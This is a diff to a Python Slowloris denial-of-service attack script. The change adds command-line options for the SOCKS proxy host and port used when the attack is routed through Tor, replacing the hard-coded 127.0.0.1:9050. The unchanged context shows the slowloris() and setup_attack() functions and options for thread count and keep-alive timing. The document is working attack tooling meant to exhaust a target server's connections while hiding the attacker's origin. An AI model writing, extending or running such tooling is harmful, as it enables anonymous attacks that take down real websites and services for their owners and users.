@@ -14,6 +14,8 @@ parser.add_argument('-t', '--tor', help='enable to attack through TOR', action="
 parser.add_argument('-n', dest='threads', type=int, default=8, nargs='?', help='number of threads (default 8)', action="store")
 parser.add_argument('-k', dest='keepalive', type=int, default=90, nargs='?', help='seconds to keep connection alive (default 90)', action="store")
 parser.add_argument('-i', dest='interval', type=int, default=5, nargs='?', help='seconds between keep alive check intervals (default 5)', action="store")
+parser.add_argument('-sh', dest='sockshost', default='127.0.0.1', nargs='?', help='host TOR is running (default 127.0.0.1)', action="store")
+parser.add_argument('-sp', dest='socksport', type=int, default=9050, nargs='?', help='port TOR is using (default 9050)', action="store")
 args = parser.parse_args()
 
 def slowloris():
@@ -51,7 +53,7 @@ def setup_attack(host, port):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
             if args.tor:
-                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
+                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, args.sockshost, args.socksport)
                 socket.socket = socks.socksocket
 
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
